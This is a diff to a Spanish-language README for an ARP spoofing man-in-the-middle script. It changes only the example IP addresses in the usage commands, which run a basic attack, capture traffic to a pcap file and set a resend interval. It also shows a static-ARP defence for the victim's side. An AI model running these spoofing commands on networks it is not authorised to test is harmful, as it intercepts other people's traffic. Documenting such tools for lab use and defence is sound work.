@@ -45,13 +45,13 @@ y el gateway.
 
 ```bash
 # Ataque básico
-sudo python3 arp_mitm.py -i eth0 -v 192.168.1.10 -g 192.168.1.1
+sudo python3 arp_mitm.py -i eth0 -v 192.168.67.60 -g 192.168.67.1
 
 # Con captura de tráfico
-sudo python3 arp_mitm.py -i eth0 -v 192.168.1.10 -g 192.168.1.1 -s -o trafico.pcap
+sudo python3 arp_mitm.py -i eth0 -v 192.168.67.60 -g 192.168.67.1 -s -o trafico.pcap
 
 # Con intervalo de reenvío personalizado
-sudo python3 arp_mitm.py -i eth0 -v 192.168.1.10 -g 192.168.1.1 -t 1.0
+sudo python3 arp_mitm.py -i eth0 -v 192.168.67.60 -g 192.168.67.1 -t 1.0
 ```
 
 ### Verificar el ataque desde la víctima
@@ -84,7 +84,7 @@ interface range FastEthernet0/1-24
 ### En Linux (víctima)
 ```bash
 # ARP estático para el gateway
-sudo arp -s 192.168.1.1 AA:BB:CC:DD:EE:FF
+sudo arp -s 192.168.67.1 AA:BB:CC:DD:EE:FF
 
 # Verificar tabla ARP
 arp -a
